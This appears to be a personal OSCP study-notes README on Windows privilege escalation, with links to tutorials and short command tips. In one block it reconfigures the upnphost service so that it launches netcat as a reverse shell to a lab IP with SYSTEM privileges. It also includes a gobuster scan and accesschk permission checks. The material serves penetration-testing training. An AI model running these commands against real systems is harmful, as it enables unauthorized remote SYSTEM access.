# Learn OSCP



- [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
- [AccessChk v6.12](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) 用于确认 *windows* 用户权限
- [msfvenom-cheat-sheet](https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/)

- [Windows-pentest](https://github.com/ankh2054/windows-pentest) 包含有 *xp* 版本的 *accesschk*
- [Windows_Privesec](https://gist.github.com/sckalath/8dacd032b65404ef7411) 与  [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html) 的 *Roll up Your Sleeves* 比较像
- [OSCP-Windows-privilege-escalation](https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html) 与 第一篇文章相比，条理更清晰，内容更精简， 建议结合起来使用。

#### Tips

##### 路径信息收集

```shell
# gobuster dir -u http://X.X.X.X/ -w /mnt/hgfs/share/OSCP/SecLists/Discovery/Web-Content/common.txt   -s '200,204,301,302,307,403,500' -e  -t 50
```



#####  查看当前用户身份的方式

```vbscript
# 无法执行 whoami 以及 echo %username% 的场景
# 解决方案一
echo 1>who.ami
dir /q

# 解决方案二
# 上传 kali 中的 /usr/share/windows-binaries/whoami.exe 到服务器上
```



##### 文件上传的存放位置

`C:\RECYCLER ` 通常是可读写的目录，上传的 *exp* 建议放在这儿。



##### Bash 创建特殊的文件

```bash
touch ./-filename.txt
touch -- -filename.txt
rm ./-filename.txt
rm -- --filename.txt
```

##### 查找权限存在问题的的 services

*[accesschk](https://web.archive.org/web/20111111130246/http://live.sysinternals.com/accesschk.exe)* (*Windows XP*) 可用于判断 *servcies* 的权限，总是先执行 `/acceptula`。因为第一次执行该程序会弹窗，所以带入参数来确认弹窗。

```shell
# 建议每次从命令行执行accesschk时，都带上/accepteula

accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv SSDPSRV /accepteula
accesschk.exe -ucqv upnphost /accepteula



sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.120 2233 -e C:\WINDOWS\System32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost

C:\"Documents and Settings"\Administrator\Desktop\proof.txt

```



##### 提权方式

1. 配置存在问题的 *services*
2. [*Exploiting environment variables*](http://techblog.rosedu.org/exploiting-environment-variables.html)

3. [restricted-linux-shell-escaping-techniques/](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)


# ChangeLog
- 20190701 init
